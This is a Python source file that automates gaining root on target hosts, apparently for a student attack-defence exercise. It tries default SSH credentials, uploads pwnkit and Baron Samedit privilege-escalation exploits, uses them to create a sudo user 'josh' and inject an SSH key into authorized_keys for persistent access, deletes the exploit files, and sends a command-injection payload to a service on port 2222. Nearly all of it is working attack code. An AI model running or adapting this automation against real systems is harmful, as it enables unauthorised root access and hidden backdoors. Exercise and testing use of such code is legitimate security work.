import paramiko
import socket
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_ORANGE = '\033[93m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class UserIP:
	def __init__(self, ip_address, credentials, public_ssh_key_to_inject):
		self.ip_address = ip_address
		self.got_root = False
		self.credentials = credentials
		self.public_ssh_key_to_inject = public_ssh_key_to_inject

	def __repr__(self) -> str:
		"""
		Represent the Object as a string
		"""
		return f"{type(self).__name__}({self.ip_address})"

	def __check_login(self, username, password, is_sudo_user, exploit_pwnkit=False, exploit_baron_samedit=False):
		"""
		Returns True if we successfully got root, and returns False otherwise
		"""
		try:
			got_root = False
			logger.info(f"Logging in as `{username}` over SSH...")
			ssh_client = paramiko.SSHClient()
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(self.ip_address, username=username, password=password, timeout=5)
			logger.info(f"{COLOR_ORANGE}Successfully logged in as `{username}`.{COLOR_END}")
		except paramiko.AuthenticationException as err:
			logger.info(f"{COLOR_FAIL}Failed to log in as `{username}`. The user most likely changed their password!{COLOR_END}")
			return False
		except Exception as err:
			logger.info(f"{COLOR_FAIL}Failed to log in as `{username}`{COLOR_END}")
			return False

		if is_sudo_user:
			ssh_client.close()
			logger.info(f"{COLOR_OKGREEN}This user has sudo access so we don't even need to try exploits!{COLOR_END}")
			return True

		logger.info(f"Attempting to get root using unpatched privilege escalation CVEs...")
		if not got_root and exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
			got_root = self.exploit_pwnkit(ssh_client=ssh_client, username=username)
		if not got_root and exploit_baron_samedit:
			got_root = self.exploit_baron_samedit(ssh_client=ssh_client, username=username)

		ssh_client.close()
		if not got_root:
			logger.info(f"{COLOR_FAIL}Failed to get root using unpatched privilege escalation CVEs.{COLOR_END}")
		return got_root

	def exploit_pwnkit(self, ssh_client, username):
		"""
		Exploits pwnkit over an existing SSH connection
		"""
		try:
			logger.info("Attempting to exploit the pwnkit vulnerability...")
			logger.info("Copying pwnkit_x64 binary over SSH...")
			sftp = ssh_client.open_sftp()
			pwnkit_binary_name = "pwnkit_x64"
			pwnkit_destination_path = f"/home/{username}/{pwnkit_binary_name}"
			sftp.put(localpath=f"./exploits/{pwnkit_binary_name}", remotepath=pwnkit_destination_path, confirm=True)
			logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH.")
			sftp.close()

			logger.info("Setting the pwnkit binary to be executable...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"chmod +x ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully set the pwnkit binary to be executable.")

			logger.info("Checking for root privileges...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | ./{pwnkit_binary_name}")
			output_as_string = ssh_stdout.read().decode().strip()
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.debug(f"'whoami' output: {output_as_string}")

			logger.info("Creating sudo user to log in as...")
			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully created user to log in as.")

			logger.info("Adding SSH key to elliot's authorized keys...")
			add_ssh_key_command = f"grep -qxF \"{self.public_ssh_key_to_inject}\" /home/elliot/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/elliot/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to elliot's authorized keys.")

			logger.info("Adding SSH key to josh's authorized keys...")
			# the following line is a little complex, first we create the .ssh directory if it doesn't exist, then check if our public SSH key is in the authorized keys, then we add it to the authorized keys if it is not already there
			add_ssh_key_command = f"mkdir -p /home/josh/.ssh && grep -qxF \"{self.public_ssh_key_to_inject}\" /home/josh/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/josh/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to josh's authorized keys.")

			logger.info("Cleaning up pwnkit binary...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {pwnkit_destination_path}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully cleaned up the pwnkit binary.")

			ssh_client.close()

			if output_as_string == "root":
				logger.info(f"{COLOR_OKGREEN}Successfully got root via the user `{username}` using pwnkit.{COLOR_END}")
				return True
			else:
				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit.{COLOR_END}")
				return False
		except Exception as err:
			logger.exception(err)
			return False

	def exploit_baron_samedit(self, ssh_client, username):
		"""
		Exploits baron samedit over an existing SSH connection
		"""
		try:
			logger.info("Attempting to exploit the Baron Samedit vulnerability...")
			logger.info("Copying baron_samedit.py over SSH...")
			sftp = ssh_client.open_sftp()
			baron_samedit_script = "baron_samedit.py"
			baron_samedit_script_destination_path = f"/home/{username}/{baron_samedit_script}"
			sftp.put(localpath=f"./exploits/{baron_samedit_script}", remotepath=baron_samedit_script_destination_path, confirm=True)
			logger.info(f"Successfully copied {baron_samedit_script} over SSH.")
			sftp.close()

			logger.info("Checking for root privileges...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | python3 {baron_samedit_script}")
			output_as_string = ssh_stdout.read().decode().strip()
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.debug(f"'whoami' output: {output_as_string}")

			logger.info("Creating sudo user to log in as...")
			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully created user to log in as.")

			logger.info("Adding SSH key to elliot's authorized keys...")
			add_ssh_key_command = f"grep -qxF \"{self.public_ssh_key_to_inject}\" /home/elliot/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/elliot/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to elliot's authorized keys.")

			logger.info("Adding SSH key to josh's authorized keys...")
			# the following line is a little complex, first we create the .ssh directory if it doesn't exist, then check if our public SSH key is in the authorized keys, then we add it to the authorized keys if it is not already there
			add_ssh_key_command = f"mkdir -p /home/josh/.ssh && grep -qxF \"{self.public_ssh_key_to_inject}\" /home/josh/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/josh/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to josh's authorized keys.")

			logger.info("Cleaning up baron_samedit script...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {baron_samedit_script_destination_path}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully cleaned up the baron_samedit script.")

			ssh_client.close()

			if output_as_string == "root":
				logger.info(f"{COLOR_OKGREEN}Successfully got root via the user `{username}` using Baron Samedit.{COLOR_END}")
				return True
			else:
				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to Baron Samedit.{COLOR_END}")
				return False
		except Exception as err:
			logger.exception(err)
			return False

	def exploit_challenge_one_python(self):
		"""
		Returns True if we got root, otherwise returns False
		"""
		logger.info("====== ATTEMPTING EXPLOIT - CHALLENGE ONE - PYTHON =========")
		try:
			port = 2222
			logger.info(f"Connecting to port {port}...")
			socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			socket_connection.connect((self.ip_address, port))
			logger.info(f"Successfully connected to port {port}.")
		except ConnectionRefusedError as err:
			logger.info(f"{COLOR_FAIL}The challenge one python service is not running!{COLOR_END}")
			return False

		exploit_command = "ls; echo '0x1x2x3'; whoami" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
		logger.info("Checking if the student patched the vulnerability...")
		socket_connection.sendall(exploit_command.encode())
		socket_connection.shutdown(socket.SHUT_WR)
		socket_response = ""
		while 1:
			data = socket_connection.recv(1024)
			if len(data) == 0:
				break
			socket_response = data.decode()
		socket_connection.close()
		logger.debug(socket_response)
		if "0x1x2x3" in socket_response:
			logged_in_user = socket_response.split("0x1x2x3")[1].strip() # split on `0x1x2x3` so we can parse for the command injection output
			logger.debug(f"Logged in as `{logged_in_user}`")
			if logged_in_user == "elliot":
				logger.info(f"{COLOR_OKGREEN}The challenge one python service has not been patched!{COLOR_END}")
				return True
		logger.info(f"{COLOR_FAIL}The challenge one python service has been patched!{COLOR_END}")
		return False

	def check_all_logins(self):
		"""
		Tries to connect using all default credentials

		return_when_root: If set to False, all logins will be checked regardless of whether or not we successfully got root
		"""
		logger.info("====== ATTEMPTING TO GET ROOT WITH DEFAULT CREDENTIALS OVER SSH =========")
		got_root = False
		for credential in self.credentials:
			got_root_with_credentials = self.__check_login(username=credential["username"], password=credential["password"], is_sudo_user=credential["sudo_user"])
			if got_root_with_credentials:
				got_root = True
				break
		return got_root

	def get_root(self):
		"""
		Tries all exploits in an attempt to get root
		"""
		got_root = False
		if not got_root:
			got_root = self.check_all_logins()
		if not got_root:
			got_root = self.exploit_challenge_one_python()

		if got_root:
			logger.info(f"{COLOR_OKBLUE}Successfully got root on {self.ip_address}{COLOR_END}")
		else:
			logger.info(f"{COLOR_FAIL}Failed to get root on {self.ip_address}{COLOR_END}")
